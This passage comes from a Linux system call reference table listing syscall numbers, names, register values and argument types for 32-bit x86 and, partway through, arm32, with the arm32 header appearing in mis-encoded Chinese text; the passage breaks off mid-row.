0x3e unsigned dev struct ustat *ubuf - 63 dup2 0x3f unsigned int oldfd unsigned int newfd - 64 getppid 0x40 - - - 65 getpgrp 0x41 - - - 66 setsid 0x42 - - - 67 sigaction 0x43 int const struct old_sigaction * struct old_sigaction * 68 sgetmask 0x44 - - - 69 ssetmask 0x45 int newmask - - 70 setreuid 0x46 uid_t ruid uid_t euid - 71 setregid 0x47 gid_t rgid gid_t egid - 72 sigsuspend 0x48 int unused1 int unused2 old_sigset_t mask 73 sigpending 0x49 old_sigset_t *uset - - 74 sethostname 0x4a char *name int len - 75 setrlimit 0x4b unsigned int resource struct rlimit *rlim - 76 getrlimit 0x4c unsigned int resource struct rlimit *rlim - 77 getrusage 0x4d int who struct rusage *ru - 78 gettimeofday 0x4e struct __kernel_old_timeval *tv struct timezone *tz - 79 settimeofday 0x4f struct __kernel_old_timeval *tv struct timezone *tz - 80 getgroups 0x50 int gidsetsize gid_t *grouplist - 81 setgroups 0x51 int gidsetsize gid_t *grouplist - 82 select 0x52 int n fd_set *inp fd_set *outp 83 symlink 0x53 const char *old const char *new - 84 oldlstat 0x54 ? ? ? 85 readlink 0x55 const char *path char *buf int bufsiz 86 uselib 0x56 const char *library - - 87 swapon 0x57 const char *specialfile int swap_flags - 88 reboot 0x58 int magic1 int magic2 unsigned int cmd 89 readdir 0x59 ? ? ? 90 mmap 0x5a ? ? ? 91 munmap 0x5b unsigned long addr size_t len - 92 truncate 0x5c const char *path long length - 93 ftruncate 0x5d unsigned int fd unsigned long length - 94 fchmod 0x5e unsigned int fd umode_t mode - 95 fchown 0x5f unsigned int fd uid_t user gid_t group 96 getpriority 0x60 int which int who - 97 setpriority 0x61 int which int who int niceval 98 profil 0x62 ? ? ? 99 statfs 0x63 const char * path struct statfs *buf - 100 fstatfs 0x64 unsigned int fd struct statfs *buf - 101 ioperm 0x65 unsigned long from unsigned long num int on 102 socketcall 0x66 int call unsigned long *args - 103 syslog 0x67 int type char *buf int len 104 setitimer 0x68 int which struct __kernel_old_itimerval *value struct __kernel_old_itimerval *ovalue 105 getitimer 0x69 int which struct __kernel_old_itimerval *value - 106 stat 0x6a const char *filename struct __old_kernel_stat *statbuf - 107 lstat 0x6b const char *filename struct __old_kernel_stat *statbuf - 108 fstat 0x6c unsigned int fd struct __old_kernel_stat *statbuf - 109 olduname 0x6d struct oldold_utsname * - - 110 iopl 0x6e ? ? ? 111 vhangup 0x6f - - - 112 idle 0x70 ? ? ? 113 vm86old 0x71 ? ? ? 114 wait4 0x72 pid_t pid int *stat_addr int options 115 swapoff 0x73 const char *specialfile - - 116 sysinfo 0x74 struct sysinfo *info - - 117 ipc 0x75 unsigned int call int first unsigned long second 118 fsync 0x76 unsigned int fd - - 119 sigreturn 0x77 ? ? ? 120 clone 0x78 unsigned long unsigned long int * 121 setdomainname 0x79 char *name int len - 122 uname 0x7a struct old_utsname * - - 123 modify_ldt 0x7b ? ? ? 124 adjtimex 0x7c struct __kernel_timex *txc_p - - 125 mprotect 0x7d unsigned long start size_t len unsigned long prot 126 sigprocmask 0x7e int how old_sigset_t *set old_sigset_t *oset 127 create_module 0x7f ? ? ? 128 init_module 0x80 void *umod unsigned long len const char *uargs 129 delete_module 0x81 const char *name_user unsigned int flags - 130 get_kernel_syms 0x82 ? ? ? 131 quotactl 0x83 unsigned int cmd const char *special qid_t id 132 getpgid 0x84 pid_t pid - - 133 fchdir 0x85 unsigned int fd - - 134 bdflush 0x86 ? ? ? 135 sysfs 0x87 int option unsigned long arg1 unsigned long arg2 136 personality 0x88 unsigned int personality - - 137 afs_syscall 0x89 ? ? ? 138 setfsuid 0x8a uid_t uid - - 139 setfsgid 0x8b gid_t gid - - 140 _llseek 0x8c ? ? ? 141 getdents 0x8d unsigned int fd struct linux_dirent *dirent unsigned int count 142 _newselect 0x8e ? ? ? 143 flock 0x8f unsigned int fd unsigned int cmd - 144 msync 0x90 unsigned long start size_t len int flags 145 readv 0x91 unsigned long fd const struct iovec *vec unsigned long vlen 146 writev 0x92 unsigned long fd const struct iovec *vec unsigned long vlen 147 getsid 0x93 pid_t pid - - 148 fdatasync 0x94 unsigned int fd - - 149 _sysctl 0x95 ? ? ? 150 mlock 0x96 unsigned long start size_t len - 151 munlock 0x97 unsigned long start size_t len - 152 mlockall 0x98 int flags - - 153 munlockall 0x99 - - - 154 sched_setparam 0x9a pid_t pid struct sched_param *param - 155 sched_getparam 0x9b pid_t pid struct sched_param *param - 156 sched_setscheduler 0x9c pid_t pid int policy struct sched_param *param 157 sched_getscheduler 0x9d pid_t pid - - 158 sched_yield 0x9e - - - 159 sched_get_priority_max 0x9f int policy - - 160 sched_get_priority_min 0xa0 int policy - - 161 sched_rr_get_interval 0xa1 pid_t pid struct __kernel_timespec *interval - 162 nanosleep 0xa2 struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - 163 mremap 0xa3 unsigned long addr unsigned long old_len unsigned long new_len 164 setresuid 0xa4 uid_t ruid uid_t euid uid_t suid 165 getresuid 0xa5 uid_t *ruid uid_t *euid uid_t *suid 166 vm86 0xa6 ? ? ? 167 query_module 0xa7 ? ? ? 168 poll 0xa8 struct pollfd *ufds unsigned int nfds int timeout 169 nfsservctl 0xa9 ? ? ? 170 setresgid 0xaa gid_t rgid gid_t egid gid_t sgid 171 getresgid 0xab gid_t *rgid gid_t *egid gid_t *sgid 172 prctl 0xac int option unsigned long arg2 unsigned long arg3 173 rt_sigreturn 0xad ? ? ? 174 rt_sigaction 0xae int const struct sigaction * struct sigaction * 175 rt_sigprocmask 0xaf int how sigset_t *set sigset_t *oset 176 rt_sigpending 0xb0 sigset_t *set size_t sigsetsize - 177 rt_sigtimedwait 0xb1 const sigset_t *uthese siginfo_t *uinfo const struct __kernel_timespec *uts 178 rt_sigqueueinfo 0xb2 pid_t pid int sig siginfo_t *uinfo 179 rt_sigsuspend 0xb3 sigset_t *unewset size_t sigsetsize - 180 pread64 0xb4 unsigned int fd char *buf size_t count 181 pwrite64 0xb5 unsigned int fd const char *buf size_t count 182 chown 0xb6 const char *filename uid_t user gid_t group 183 getcwd 0xb7 char *buf unsigned long size - 184 capget 0xb8 cap_user_header_t header cap_user_data_t dataptr - 185 capset 0xb9 cap_user_header_t header const cap_user_data_t data - 186 sigaltstack 0xba const struct sigaltstack *uss struct sigaltstack *uoss - 187 sendfile 0xbb int out_fd int in_fd off_t *offset 188 getpmsg 0xbc ? ? ? 189 putpmsg 0xbd ? ? ? 190 vfork 0xbe - - - 191 ugetrlimit 0xbf ? ? ? 192 mmap2 0xc0 ? ? ? 193 truncate64 0xc1 const char *path loff_t length - 194 ftruncate64 0xc2 unsigned int fd loff_t length - 195 stat64 0xc3 const char *filename struct stat64 *statbuf - 196 lstat64 0xc4 const char *filename struct stat64 *statbuf - 197 fstat64 0xc5 unsigned long fd struct stat64 *statbuf - 198 lchown32 0xc6 ? ? ? 199 getuid32 0xc7 ? ? ? 200 getgid32 0xc8 ? ? ? 201 geteuid32 0xc9 ? ? ? 202 getegid32 0xca ? ? ? 203 setreuid32 0xcb ? ? ? 204 setregid32 0xcc ? ? ? 205 getgroups32 0xcd ? ? ? 206 setgroups32 0xce ? ? ? 207 fchown32 0xcf ? ? ? 208 setresuid32 0xd0 ? ? ? 209 getresuid32 0xd1 ? ? ? 210 setresgid32 0xd2 ? ? ? 211 getresgid32 0xd3 ? ? ? 212 chown32 0xd4 ? ? ? 213 setuid32 0xd5 ? ? ? 214 setgid32 0xd6 ? ? ? 215 setfsuid32 0xd7 ? ? ? 216 setfsgid32 0xd8 ? ? ? 217 pivot_root 0xd9 const char *new_root const char *put_old - 218 mincore 0xda unsigned long start size_t len unsigned char * vec 219 madvise 0xdb unsigned long start size_t len int behavior 220 getdents64 0xdc unsigned int fd struct linux_dirent64 *dirent unsigned int count 221 fcntl64 0xdd unsigned int fd unsigned int cmd unsigned long arg 222 not implemented 0xde 223 not implemented 0xdf 224 gettid 0xe0 - - - 225 readahead 0xe1 int fd loff_t offset size_t count 226 setxattr 0xe2 const char *path const char *name const void *value 227 lsetxattr 0xe3 const char *path const char *name const void *value 228 fsetxattr 0xe4 int fd const char *name const void *value 229 getxattr 0xe5 const char *path const char *name void *value 230 lgetxattr 0xe6 const char *path const char *name void *value 231 fgetxattr 0xe7 int fd const char *name void *value 232 listxattr 0xe8 const char *path char *list size_t size 233 llistxattr 0xe9 const char *path char *list size_t size 234 flistxattr 0xea int fd char *list size_t size 235 removexattr 0xeb const char *path const char *name - 236 lremovexattr 0xec const char *path const char *name - 237 fremovexattr 0xed int fd const char *name - 238 tkill 0xee pid_t pid int sig - 239 sendfile64 0xef int out_fd int in_fd loff_t *offset 240 futex 0xf0 u32 *uaddr int op u32 val 241 sched_setaffinity 0xf1 pid_t pid unsigned int len unsigned long *user_mask_ptr 242 sched_getaffinity 0xf2 pid_t pid unsigned int len unsigned long *user_mask_ptr 243 set_thread_area 0xf3 ? ? ? 244 get_thread_area 0xf4 ? ? ? 245 io_setup 0xf5 unsigned nr_reqs aio_context_t *ctx - 246 io_destroy 0xf6 aio_context_t ctx - - 247 io_getevents 0xf7 aio_context_t ctx_id long min_nr long nr 248 io_submit 0xf8 aio_context_t long struct iocb 249 io_cancel 0xf9 aio_context_t ctx_id struct iocb *iocb struct io_event *result 250 fadvise64 0xfa int fd loff_t offset size_t len 251 not implemented 0xfb 252 exit_group 0xfc int error_code - - 253 lookup_dcookie 0xfd u64 cookie64 char *buf size_t len 254 epoll_create 0xfe int size - - 255 epoll_ctl 0xff int epfd int op int fd 256 epoll_wait 0x100 int epfd struct epoll_event *events int maxevents 257 remap_file_pages 0x101 unsigned long start unsigned long size unsigned long prot 258 set_tid_address 0x102 int *tidptr - - 259 timer_create 0x103 clockid_t which_clock struct sigevent *timer_event_spec timer_t * created_timer_id 260 timer_settime 0x104 timer_t timer_id int flags const struct __kernel_itimerspec *new_setting 261 timer_gettime 0x105 timer_t timer_id struct __kernel_itimerspec *setting - 262 timer_getoverrun 0x106 timer_t timer_id - - 263 timer_delete 0x107 timer_t timer_id - - 264 clock_settime 0x108 clockid_t which_clock const struct __kernel_timespec *tp - 265 clock_gettime 0x109 clockid_t which_clock struct __kernel_timespec *tp - 266 clock_getres 0x10a clockid_t which_clock struct __kernel_timespec *tp - 267 clock_nanosleep 0x10b clockid_t which_clock int flags const struct __kernel_timespec *rqtp 268 statfs64 0x10c const char *path size_t sz struct statfs64 *buf 269 fstatfs64 0x10d unsigned int fd size_t sz struct statfs64 *buf 270 tgkill 0x10e pid_t tgid pid_t pid int sig 271 utimes 0x10f char *filename struct __kernel_old_timeval *utimes - 272 fadvise64_64 0x110 int fd loff_t offset loff_t len 273 vserver 0x111 ? ? ? 274 mbind 0x112 unsigned long start unsigned long len unsigned long mode 275 get_mempolicy 0x113 int *policy unsigned long *nmask unsigned long maxnode 276 set_mempolicy 0x114 int mode const unsigned long *nmask unsigned long maxnode 277 mq_open 0x115 const char *name int oflag umode_t mode 278 mq_unlink 0x116 const char *name - - 279 mq_timedsend 0x117 mqd_t mqdes const char *msg_ptr size_t msg_len 280 mq_timedreceive 0x118 mqd_t mqdes char *msg_ptr size_t msg_len 281 mq_notify 0x119 mqd_t mqdes const struct sigevent *notification - 282 mq_getsetattr 0x11a mqd_t mqdes const struct mq_attr *mqstat struct mq_attr *omqstat 283 kexec_load 0x11b unsigned long entry unsigned long nr_segments struct kexec_segment *segments 284 waitid 0x11c int which pid_t pid struct siginfo *infop 285 not implemented 0x11d 286 add_key 0x11e const char *_type const char *_description const void *_payload 287 request_key 0x11f const char *_type const char *_description const char *_callout_info 288 keyctl 0x120 int cmd unsigned long arg2 unsigned long arg3 289 ioprio_set 0x121 int which int who int ioprio 290 ioprio_get 0x122 int which int who - 291 inotify_init 0x123 - - - 292 inotify_add_watch 0x124 int fd const char *path u32 mask 293 inotify_rm_watch 0x125 int fd __s32 wd - 294 migrate_pages 0x126 pid_t pid unsigned long maxnode const unsigned long *from 295 openat 0x127 int dfd const char *filename int flags 296 mkdirat 0x128 int dfd const char * pathname umode_t mode 297 mknodat 0x129 int dfd const char * filename umode_t mode 298 fchownat 0x12a int dfd const char *filename uid_t user 299 futimesat 0x12b int dfd const char *filename struct __kernel_old_timeval *utimes 300 fstatat64 0x12c int dfd const char *filename struct stat64 *statbuf 301 unlinkat 0x12d int dfd const char * pathname int flag 302 renameat 0x12e int olddfd const char * oldname int newdfd 303 linkat 0x12f int olddfd const char *oldname int newdfd 304 symlinkat 0x130 const char * oldname int newdfd const char * newname 305 readlinkat 0x131 int dfd const char *path char *buf 306 fchmodat 0x132 int dfd const char * filename umode_t mode 307 faccessat 0x133 int dfd const char *filename int mode 308 pselect6 0x134 int fd_set * fd_set * 309 ppoll 0x135 struct pollfd * unsigned int struct __kernel_timespec * 310 unshare 0x136 unsigned long unshare_flags - - 311 set_robust_list 0x137 struct robust_list_head *head size_t len - 312 get_robust_list 0x138 int pid struct robust_list_head head_ptr size_t *len_ptr 313 splice 0x139 int fd_in loff_t *off_in int fd_out 314 sync_file_range 0x13a int fd loff_t offset loff_t nbytes 315 tee 0x13b int fdin int fdout size_t len 316 vmsplice 0x13c int fd const struct iovec *iov unsigned long nr_segs 317 move_pages 0x13d pid_t pid unsigned long nr_pages const void pages 318 getcpu 0x13e unsigned *cpu unsigned *node struct getcpu_cache *cache 319 epoll_pwait 0x13f int epfd struct epoll_event *events int maxevents 320 utimensat 0x140 int dfd const char *filename struct __kernel_timespec *utimes 321 signalfd 0x141 int ufd sigset_t *user_mask size_t sizemask 322 timerfd_create 0x142 int clockid int flags - 323 eventfd 0x143 unsigned int count - - 324 fallocate 0x144 int fd int mode loff_t offset 325 timerfd_settime 0x145 int ufd int flags const struct __kernel_itimerspec *utmr 326 timerfd_gettime 0x146 int ufd struct __kernel_itimerspec *otmr - 327 signalfd4 0x147 int ufd sigset_t *user_mask size_t sizemask 328 eventfd2 0x148 unsigned int count int flags - 329 epoll_create1 0x149 int flags - - 330 dup3 0x14a unsigned int oldfd unsigned int newfd int flags 331 pipe2 0x14b int *fildes int flags - 332 inotify_init1 0x14c int flags - - 333 preadv 0x14d unsigned long fd const struct iovec *vec unsigned long vlen 334 pwritev 0x14e unsigned long fd const struct iovec *vec unsigned long vlen 335 rt_tgsigqueueinfo 0x14f pid_t tgid pid_t pid int sig 336 perf_event_open 0x150 struct perf_event_attr *attr_uptr pid_t pid int cpu 337 recvmmsg 0x151 int fd struct mmsghdr *msg unsigned int vlen 338 fanotify_init 0x152 unsigned int flags unsigned int event_f_flags - 339 fanotify_mark 0x153 int fanotify_fd unsigned int flags u64 mask 340 prlimit64 0x154 pid_t pid unsigned int resource const struct rlimit64 *new_rlim 341 name_to_handle_at 0x155 int dfd const char *name struct file_handle *handle 342 open_by_handle_at 0x156 int mountdirfd struct file_handle *handle int flags 343 clock_adjtime 0x157 clockid_t which_clock struct __kernel_timex *tx - 344 syncfs 0x158 int fd - - 345 sendmmsg 0x159 int fd struct mmsghdr *msg unsigned int vlen 346 setns 0x15a int fd int nstype - 347 process_vm_readv 0x15b pid_t pid const struct iovec *lvec unsigned long liovcnt 348 process_vm_writev 0x15c pid_t pid const struct iovec *lvec unsigned long liovcnt 349 kcmp 0x15d pid_t pid1 pid_t pid2 int type 350 finit_module 0x15e int fd const char *uargs int flags 351 sched_setattr 0x15f pid_t pid struct sched_attr *attr unsigned int flags 352 sched_getattr 0x160 pid_t pid struct sched_attr *attr unsigned int size 353 renameat2 0x161 int olddfd const char *oldname int newdfd 354 seccomp 0x162 unsigned int op unsigned int flags void *uargs 355 getrandom 0x163 char *buf size_t count unsigned int flags 356 memfd_create 0x164 const char *uname_ptr unsigned int flags - 357 bpf 0x165 int cmd union bpf_attr *attr unsigned int size 358 execveat 0x166 int dfd const char *filename const char *const *argv 359 socket 0x167 int int int 360 socketpair 0x168 int int int 361 bind 0x169 int struct sockaddr * int 362 connect 0x16a int struct sockaddr * int 363 listen 0x16b int int - 364 accept4 0x16c int struct sockaddr * int * 365 getsockopt 0x16d int fd int level int optname 366 setsockopt 0x16e int fd int level int optname 367 getsockname 0x16f int struct sockaddr * int * 368 getpeername 0x170 int struct sockaddr * int * 369 sendto 0x171 int void * size_t 370 sendmsg 0x172 int fd struct user_msghdr *msg unsigned flags 371 recvfrom 0x173 int void * size_t 372 recvmsg 0x174 int fd struct user_msghdr *msg unsigned flags 373 shutdown 0x175 int int - 374 userfaultfd 0x176 int flags - - 375 membarrier 0x177 int cmd unsigned int flags int cpu_id 376 mlock2 0x178 unsigned long start size_t len int flags 377 copy_file_range 0x179 int fd_in loff_t *off_in int fd_out 378 preadv2 0x17a unsigned long fd const struct iovec *vec unsigned long vlen 379 pwritev2 0x17b unsigned long fd const struct iovec *vec unsigned long vlen 380 pkey_mprotect 0x17c unsigned long start size_t len unsigned long prot 381 pkey_alloc 0x17d unsigned long flags unsigned long init_val - 382 pkey_free 0x17e int pkey - - 383 statx 0x17f int dfd const char *path unsigned flags 384 arch_prctl 0x180 ? ? ? 385 not implemented 0x181 386 not implemented 0x182 387 not implemented 0x183 388 not implemented 0x184 389 not implemented 0x185 390 not implemented 0x186 391 not implemented 0x187 392 not implemented 0x188 393 not implemented 0x189 394 not implemented 0x18a 395 not implemented 0x18b 396 not implemented 0x18c 397 not implemented 0x18d 398 not implemented 0x18e 399 not implemented 0x18f 400 not implemented 0x190 401 not implemented 0x191 402 not implemented 0x192 403 clock_gettime64 0x193 ? ? ? 404 clock_settime64 0x194 ? ? ? 405 clock_adjtime64 0x195 ? ? ? 406 clock_getres_time64 0x196 ? ? ? 407 clock_nanosleep_time64 0x197 ? ? ? 408 timer_gettime64 0x198 ? ? ? 409 timer_settime64 0x199 ? ? ? 410 timerfd_gettime64 0x19a ? ? ? 411 timerfd_settime64 0x19b ? ? ? 412 utimensat_time64 0x19c ? ? ? 413 pselect6_time64 0x19d ? ? ? 414 ppoll_time64 0x19e ? ? ? 415 not implemented 0x19f 416 io_pgetevents_time64 0x1a0 ? ? ? 417 recvmmsg_time64 0x1a1 ? ? ? 418 mq_timedsend_time64 0x1a2 ? ? ? 419 mq_timedreceive_time64 0x1a3 ? ? ? 420 semtimedop_time64 0x1a4 ? ? ? 421 rt_sigtimedwait_time64 0x1a5 ? ? ? 422 futex_time64 0x1a6 ? ? ? 423 sched_rr_get_interval_time64 0x1a7 ? ? ? 424 not implemented 0x1a8 425 io_uring_setup 0x1a9 u32 entries struct io_uring_params *p - 426 io_uring_enter 0x1aa unsigned int fd u32 to_submit u32 min_complete 427 not implemented 0x1ab 428 not implemented 0x1ac 429 not implemented 0x1ad 430 not implemented 0x1ae 431 not implemented 0x1af 432 not implemented 0x1b0 433 not implemented 0x1b1 434 not implemented 0x1b2 435 not implemented 0x1b3 436 not implemented 0x1b4 437 not implemented 0x1b5 438 not implemented 0x1b6 439 faccessat2 0x1b7 int dfd const char *filename int mode arm32ç³»ç»Ÿè°ƒç”¨è¡¨ NR syscall name %r7 arg0 (%r0) arg1 (%r1) arg2 (%r2) 0 restart_syscall 0x00 - - - 1 exit 0x01 int error_code - - 2 fork 0x02 - - - 3 read 0x03 unsigned int fd char *buf size_t count 4 write 0x04 unsigned int fd const char *buf size_t count 5 open 0x05 const char *filename int flags umode_t mode 6 close 0x06 unsigned int fd - - 7 not implemented 0x07 8 creat 0x08 const char *pathname umode_t mode - 9 link 0x09 const char *oldname const char *newname - 10 unlink 0x0a const char *pathname - - 11 execve 0x0b const char *filename const char *const *argv const char *const *envp 12 chdir 0x0c const char *filename - - 13 not implemented 0x0d 14 mknod 0x0e const char *filename umode_t mode unsigned dev 15 chmod 0x0f const char *filename umode_t mode - 16 lchown 0x10 const char *filename uid_t user gid_t group 17 not implemented 0x11 18 not implemented 0x12 19 lseek 0x13 unsigned int fd off_t offset unsigned int whence 20 getpid 0x14 - - - 21 mount 0x15 char *dev_name char *dir_name char *type 22 not implemented 0x16 23 setuid 0x17 uid_t uid - - 24 getuid 0x18 - - - 25 not implemented 0x19 26 ptrace 0x1a long request long pid unsigned long addr 27 not implemented 0x1b 28 not implemented 0x1c 29 pause 0x1d - - - 30 not implemented 0x1e 31 not implemented 0x1f 32 not implemented 0x20 33 access 0x21 const char *filename int mode - 34 nice 0x22 int increment - - 35 not implemented 0x23 36 sync 0x24 - - - 37 kill 0x25 pid_t pid int sig - 38 rename 0x26 const char *oldname const char *newname - 39 mkdir 0x27 const char *pathname umode_t mode - 40 rmdir 0x28 const char *pathname - - 41 dup 0x29 unsigned int fildes - - 42 pipe 0x2a int *fildes - - 43 times 0x2b struct tms *tbuf - - 44 not implemented 0x2c 45 brk 0x2d unsigned long brk - - 46 setgid 0x2e gid_t gid - - 47 getgid 0x2f - - - 48 not implemented 0x30 49 geteuid 0x31 - - - 50 getegid 0x32 - - - 51 acct 0x33 const char *name - - 52 umount2 0x34 ? ? ? 53 not implemented 0x35 54 ioctl 0x36 unsigned int fd unsigned int cmd unsigned long arg 55 fcntl 0x37 unsigned int fd unsigned int cmd unsigned long arg 56 not implemented 0x38 57 setpgid 0x39 pid_t pid pid_t pgid - 58 not implemented 0x3a 59 not implemented 0x3b 60 umask 0x3c int mask - - 61 chroot 0x3d const char *filename - - 62 ustat 0x3e unsigned dev struct ustat *ubuf - 63 dup2 0x3f unsigned int oldfd unsigned int newfd - 64 getppid 0x40 - - - 65 getpgrp 0x41 - - - 66 setsid 0x42 - - - 67 sigaction 0x43 int const struct old_sigaction * struct old_sigaction * 68 not implemented 0x44 69 not implemented 0x45 70 setreuid 0x46 uid_t ruid uid_t euid - 71 setregid 0x47 gid_t rgid gid_t egid - 72 sigsuspend 0x48 int unused1 int unused2 old_sigset_t mask 73 sigpending 0x49 old_sigset_t *uset - - 74 sethostname 0x4a char *name int len - 75 setrlimit 0x4b unsigned int resource struct rlimit *rlim - 76 not implemented 0x4c 77 getrusage 0x4d int who struct rusage *ru - 78 gettimeofday 0x4e struct __kernel_old_timeval *tv struct timezone *tz - 79 settimeofday 0x4f struct __kernel_old_timeval *tv struct timezone *tz - 80 getgroups 0x50 int gidsetsize gid_t *grouplist - 81 setgroups 0x51 int gidsetsize gid_t *grouplist - 82 not implemented 0x52 83 symlink 0x53 const char *old const char *new - 84 not implemented 0x54 85 readlink 0x55 const char *path char *buf int bufsiz 86 uselib 0x56 const char *library - - 87 swapon 0x57 const char *specialfile int swap_flags - 88 reboot 0x58 int magic1 int magic2 unsigned int cmd 89 not implemented 0x59 90 not implemented 0x5a 91 munmap 0x5b unsigned long addr size_t len - 92 truncate 0x5c const char *path long length - 93 ftruncate 0x5d unsigned int fd unsigned long length - 94 fchmod 0x5e unsigned int fd umode_t mode - 95 fchown 0x5f unsigned int fd uid_t user gid_t group 96 getpriority 0x60 int which int who - 97 setpriority 0x61 int which int who int niceval 98 not implemented 0x62 99 statfs 0x63 const char * path struct statfs *buf - 100 fstatfs 0x64 unsigned int fd struct statfs *buf - 101 not implemented 0x65 102 not implemented 0x66 103 syslog 0x67 int type char *buf int len 104 setitimer 0x68 int which struct __kernel_old_itimerval *value struct __kernel_old_itimerval *ovalue 105 getitimer 0x69 int which struct __kernel_old_itimerval *value - 106 stat 0x6a const char *filename struct __old_kernel_stat *statbuf - 107 lstat 0x6b const char *filename struct __old_kernel_stat *statbuf - 108 fstat 0x6c unsigned int fd struct __old_kernel_stat *statbuf - 109 not implemented 0x6d 110 not implemented 0x6e 111 vhangup 0x6f - - - 112 not implemented 0x70 113 not implemented 0x71 114 wait4 0x72 pid_t pid int *stat_addr int options 115 swapoff 0x73 const char *specialfile - - 116 sysinfo 0x74 struct sysinfo *info - - 117 not implemented 0x75 118 fsync 0x76 unsigned int fd - - 119 sigreturn 0x77 ? ? ? 120 clone 0x78 unsigned long unsigned long int * 121 setdomainname 0x79 char *name int len - 122 uname 0x7a struct old_utsname * - - 123 not implemented 0x7b 124 adjtimex 0x7c struct __kernel_timex *txc_p - - 125 mprotect 0x7d unsigned long start size_t len unsigned long prot 126 sigprocmask 0x7e int how old_sigset_t *set old_sigset_t *oset 127 not implemented 0x7f 128 init_module 0x80 void *umod unsigned long len const char *uargs 129 delete_module 0x81 const char *name_user unsigned int flags - 130 not implemented 0x82 131 quotactl 0x83 unsigned int cmd const char *special qid_t id 132 getpgid 0x84 pid_t pid - - 133 fchdir 0x85 unsigned int fd - - 134 bdflush 0x86 ? ? ? 135 sysfs 0x87 int option unsigned long arg1 unsigned long arg2 136 personality 0x88 unsigned int personality - - 137 not implemented 0x89 138 setfsuid 0x8a uid_t uid - - 139 setfsgid 0x8b gid_t gid - - 140 _llseek 0x8c ? ? ? 141 getdents 0x8d unsigned int fd struct linux_dirent *dirent unsigned int count 142 _newselect 0x8e ? ? ? 143 flock 0x8f unsigned int fd unsigned int cmd - 144 msync 0x90 unsigned long start size_t len int flags 145 readv 0x91 unsigned long fd const struct iovec *vec unsigned long vlen 146 writev 0x92 unsigned long fd const struct iovec *vec unsigned long vlen 147 getsid 0x93 pid_t pid - - 148 fdatasync 0x94 unsigned int fd - - 149 _sysctl 0x95 ? ? ? 150 mlock 0x96 unsigned long start size_t len - 151 munlock 0x97 unsigned long start size_t len - 152 mlockall 0x98 int flags - - 153 munlockall 0x99 - - - 154 sched_setparam 0x9a pid_t pid struct sched_param *param - 155 sched_getparam 0x9b pid_t pid struct sched_param *param - 156 sched_setscheduler 0x9c pid_t pid int policy struct sched_param *param 157 sched_getscheduler 0x9d pid_t pid - - 158 sched_yield 0x9e - - - 159 sched_get_priority_max 0x9f int policy - - 160 sched_get_priority_min 0xa0 int policy - - 161 sched_rr_get_interval 0xa1 pid_t pid struct __kernel_timespec *interval - 162 nanosleep 0xa2 struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - 163 mremap 0xa3 unsigned long addr unsigned long old_len unsigned long new_len 164 setresuid 0xa4 uid_t ruid uid_t euid uid_t suid 165 getresuid 0xa5 uid_t *ruid uid_t *euid uid_t *suid 166 not implemented 0xa6 167 not implemented 0xa7 168 poll 0xa8 struct pollfd *ufds unsigned int nfds int timeout 169 nfsservctl 0xa9 ? ? ? 170 setresgid 0xaa gid_t rgid gid_t egid gid_t sgid 171 getresgid 0xab gid_t *rgid gid_t *egid gid_t *sgid 172 prctl 0xac int option unsigned long arg2 unsigned long arg3 173 rt_sigreturn 0xad ? ? ? 174 rt_sigaction 0xae int const struct sigaction * struct sigaction * 175 rt_sigprocmask 0xaf int how sigset_t *set sigset_t *oset 176 rt_sigpending 0xb0 sigset_t *set size_t sigsetsize - 177 rt_sigtimedwait 0xb1 const sigset_t *uthese siginfo_t *uinfo const struct __kernel_timespec *uts 178 rt_sigqueueinfo 0xb2 pid_t pid int sig siginfo_t *uinfo 179 rt_sigsuspend 0xb3 sigset_t *unewset size_t sigsetsize - 180 pread64 0xb4 unsigned int fd char *buf size_t count 181 pwrite64 0xb5 unsigned int fd const char *buf size_t count 182 chown 0xb6 const char *filename uid_t user gid_t group 183 getcwd 0xb7 char *buf unsigned long size - 184 capget 0xb8 cap_user_header_t header cap_user_data_t dataptr - 185 capset 0xb9 cap_user_header_t header const cap_user_data_t data - 186 sigaltstack 0xba const struct sigaltstack *uss struct sigaltstack *uoss - 187 sendfile 0xbb int out_fd int in_fd off_t *offset 188 not implemented 0xbc 189 not implemented 0xbd 190 vfork 0xbe - - - 191 ugetrlimit 0xbf ? ? ? 192 mmap2 0xc0 ? ? ? 193 truncate64 0xc1 const char *path loff_t length - 194 ftruncate64 0xc2 unsigned int fd loff_t length - 195 stat64 0xc3 const char *filename struct stat64 *statbuf - 196 lstat64 0xc4 const char *filename struct stat64 *statbuf - 197 fstat64 0xc5 unsigned long fd struct stat64 *statbuf - 198 lchown32 0xc6 ? ? ? 199 getuid32 0xc7 ? ? ? 200 getgid32 0xc8 ? ? ? 201 geteuid32 0xc9 ? ? ? 202 getegid32 0xca ? ? ? 203 setreuid32 0xcb ? ? ? 204 setregid32 0xcc ? ? ? 205 getgroups32 0xcd ? ? ? 206 setgroups32 0xce ? ? ? 207 fchown32 0xcf ? ? ? 208 setresuid32 0xd0 ? ? ? 209 getresuid32 0xd1 ? ? ? 210 setresgid32 0xd2 ? ? ? 211 getresgid32 0xd3 ? ? ? 212 chown32 0xd4 ? ? ? 213 setuid32 0xd5 ? ? ? 214 setgid32 0xd6 ? ? ? 215 setfsuid32 0xd7 ? ? ? 216 setfsgid32 0xd8 ? ? ? 217 getdents64 0xd9 unsigned int fd struct linux_dirent64 *dirent unsigned int count 218 pivot_root 0xda const char *new_root const char *put_old - 219 mincore 0xdb unsigned long start size_t len unsigned char * vec 220 madvise 0xdc unsigned long start size_t len int behavior 221 fcntl64 0xdd unsigned int fd unsigned int cmd unsigned long arg 222 not implemented 0xde 223 not implemented 0xdf 224 gettid 0xe0 - - - 225 readahead 0xe1 int fd loff_t offset size_t count 226 setxattr 0xe2 const char *path const char *name const void *value 227 lsetxattr 0xe3 const char *path const char *name const void *value 228 fsetxattr 0xe4 int fd const char *name const void *value 229 getxattr 0xe5 const char *path const char *name void *value 230 lgetxattr 0xe6 const char *path const char *name void *value 231 fgetxattr 0xe7 int fd const char *name void *value 232 listxattr 0xe8 const char *path char *list size_t size 233 llistxattr 0xe9 const char *path char *list size_t size 234 flistxattr 0xea int fd char *list size_t size 235 removexattr 0xeb const char *path const char *name - 236 lremovexattr 0xec const char *path const char *name - 237 fremovexattr 0xed int fd const char *name - 238 tkill 0xee pid_t pid int sig - 239 sendfile64 0xef int out_fd int in_fd loff_t *offset 240 futex 0xf0 u32 *uaddr int op u32 val 241 sched_setaffinity 0xf1 pid_t pid unsigned int len unsigned long *user_mask_ptr 242 sched_getaffinity 0xf2 pid_t pid unsigned int len unsigned long *user_mask_ptr 243 io_setup 